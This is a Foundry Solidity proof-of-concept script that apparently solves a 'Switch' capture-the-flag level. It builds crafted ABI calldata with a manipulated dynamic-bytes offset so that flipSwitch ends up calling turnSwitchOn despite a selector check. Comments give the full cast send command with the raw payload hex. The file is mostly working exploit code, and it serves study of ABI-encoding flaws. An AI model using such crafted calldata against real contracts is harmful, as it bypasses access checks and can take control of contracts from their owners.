// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../instances/Switch.sol";


contract POC is Script {

    Switch s = Switch(0x2b4B046F1b150e88C033D3Ee69C1182D398A0f7e);

    function run() external{
        vm.startBroadcast();

        bytes4 flipSwitchSelector = s.flipSwitch.selector; 
        bytes32 offset = 0x0000000000000000000000000000000000000000000000000000000000000060;
        bytes4 turnSwitchOnSelector = s.turnSwitchOn.selector;
    
        //exploit: 是利用bytes的abi编码规则
        bytes memory atk = bytes.concat(flipSwitchSelector, offset, bytes32(0),s.offSelector(), bytes28(0), bytes32(0x0000000000000000000000000000000000000000000000000000000000000004), turnSwitchOnSelector, bytes28(0));
        console.logBytes(atk);

        //cast send 0x2b4B046F1b150e88C033D3Ee69C1182D398A0f7e 0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000 --rpc-url $RPC --private-key=$PRIVATE_KEY
        //cast call 0x2b4B046F1b150e88C033D3Ee69C1182D398A0f7e "switchOn()(bool)" --rpc-url $RPC
        vm.stopBroadcast();
    }
}


